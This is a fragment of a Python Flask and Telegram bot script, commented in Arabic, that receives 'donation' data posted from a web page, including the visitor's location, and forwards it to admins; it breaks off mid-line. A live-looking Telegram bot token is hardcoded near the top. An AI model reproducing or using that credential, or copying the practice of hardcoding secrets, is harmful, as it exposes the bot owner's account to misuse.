import os
import json
import logging
import threading
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== الإعدادات ==========
TOKEN = "8741534004:AAEf68tu2jQqbRFELbjVKIUbU5BVW1TDESc"
ADMIN_IDS = []  # ضع معرفات المشرفين هنا - احصل عليها من @userinfobot

# إعداد التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== Flask Application ==========
app = Flask(__name__)
bot_app = None

def get_bot():
    global bot_app
    return bot_app

@app.route('/webhook', methods=['POST'])
def webhook():
    """استقبال جميع بيانات التبرع من الصفحة"""
    try:
        data = request.get_json()
        session_id = data.get('sessionId', 'unknown')
        logger.info(f"📥 Received donation data from session: {session_id}")
        
        # تنسيق الرسالة
        message = format_donation_message(data)
        
        # حفظ جميع البيانات
        save_donation(data)
        
        # إرسال إلى المشرفين
        bot = get_bot()
        if bot and ADMIN_IDS:
            for admin_id in ADMIN_IDS:
                try:
                    # إرسال الرسالة الأساسية
                    bot.bot.send_message(
                        chat_id=admin_id,
                        text=message,
                        parse_mode='HTML'
                    )
                    
                    # إرسال الموقع إذا كان متاحاً
                    location = data.get('location', {})
                    if location.get('available') and location
